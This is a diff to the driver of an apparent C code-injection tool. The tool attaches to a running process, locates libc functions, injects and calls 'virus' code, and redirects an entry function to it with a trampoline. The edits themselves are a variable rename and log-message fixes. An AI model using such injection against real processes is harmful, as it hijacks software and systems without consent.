@@ -41,10 +41,10 @@ int main(int const argc, char const * const argv[const]) {
     intptr_t offset[FUN_COUNT] = {0};
     intptr_t address[FUN_COUNT] = {0};
 
-    intptr_t entry_address = inspect_target_binary(options.binary_path, options.entry_function);
+    intptr_t entry_address_offset = inspect_target_binary(options.binary_path, options.entry_function);
     inspect_libc(options.binary_path, offset);
 
-    pstate_t pstate = attach_to_process(options.process_name, entry_address);
+    pstate_t pstate = attach_to_process(options.process_name, entry_address_offset);
     inspect_running_process(pstate.pid, offset, address);
 
     size_t virus_size = 0;
@@ -68,7 +68,7 @@ static intptr_t inspect_target_binary(char const binary_path[const], char const 
 
     intptr_t const address = get_symbol_offset_in_binary(binary_path, entry_function, false);
     check_for_error();
-    INFO("%s function found at #lx", entry_function, address);
+    INFO("%s function found at %#lx", entry_function, address);
 
     return address;
 }
@@ -92,7 +92,7 @@ static void inspect_libc(char const binary_path[const], intptr_t function_offset
 
     function_offset[FREE] = get_symbol_offset_in_binary(libc_path, "free", true);
     check_for_error();
-    INFO("free found at %#lx in libc", function_offset[FREE]);
+    INFO("free found at %#lx in libc\n", function_offset[FREE]);
 }
 
 
@@ -127,7 +127,7 @@ static pstate_t attach_to_process(char const process_name[const], intptr_t const
     save_process_regs(&pstate);
     pstate.changed_regs.rip -= 1ULL;
     check_for_error();
-    INFO("Process state saved");
+    INFO("Process state saved\n");
 
     return pstate;
 }
@@ -138,12 +138,12 @@ static void inspect_running_process(pid_t const pid, intptr_t const function_off
 
     intptr_t libc_base = locate_libc_in(pid);
     check_for_error();
-    INFO("Located libc in process %d at %#lx", libc_base);
+    INFO("Located libc in process %d at %#lx", pid, libc_base);
 
     for (size_t i = 0; i < FUN_COUNT; i++) {
         function_address[i] = libc_base + function_offset[i];
     }
-    INFO("Function addresses calculated");
+    INFO("Function addresses calculated\n");
 }
 
 
@@ -166,7 +166,7 @@ static intptr_t inject_virus(pstate_t * const pstate, intptr_t const function_ad
 
     inject_raw_code_to_process(pstate->pid, block_address, code_size, code);
     check_for_error();
-    INFO("Virus code successfully injected in the allocated memory");
+    INFO("Virus code successfully injected in the allocated memory\n");
 
     *virus_size = code_size;
     return block_address;
@@ -176,7 +176,7 @@ static intptr_t inject_virus(pstate_t * const pstate, intptr_t const function_ad
 static void execute_virus(pstate_t * const pstate, intptr_t const virus_address, int const argument) {
     int ret_val = call_virus(pstate, virus_address, argument);
     check_for_error();
-    INFO("Calling virus with %d, returned %d", argument, ret_val);
+    INFO("Calling virus with %d, returned %d\n", argument, ret_val);
 }
 
 
@@ -196,25 +196,26 @@ static void cleanup(
 
     call_free(pstate, function_address[FREE], virus_address);
     check_for_error();
-    INFO("Virus deallocated");
+    INFO("Virus deallocated\n");
 }
+
 
 static void restore_process_state(pstate_t const * const pstate) {
     revert_to(pstate);
     check_for_error();
-    INFO("Process registers and code restored (%lu bytes at %#lx)", pstate->changed_code_len, pstate->change_address);
+    INFO("Process registers and code restored (%lu bytes at %#lx)\n", pstate->changed_code_len, pstate->change_address);
 }
 
 
 static void replace_entry_function(pid_t const pid, intptr_t const entry_function, intptr_t const virus_address) {
     inject_trampoline(pid, entry_function, virus_address);
     check_for_error();
-    INFO("Entry function <%#lx> replaced with virus <%#lx>", entry_function, virus_address);
+    INFO("Entry function <%#lx> replaced with virus <%#lx>\n", entry_function, virus_address);
 }
 
 
 static void detach_process(pstate_t const *  const pstate) {
     pdetach(pstate->pid);
     check_for_error();
-    INFO("Process %d detached", pstate->pid);
+    INFO("Process %d detached\n", pstate->pid);
 }
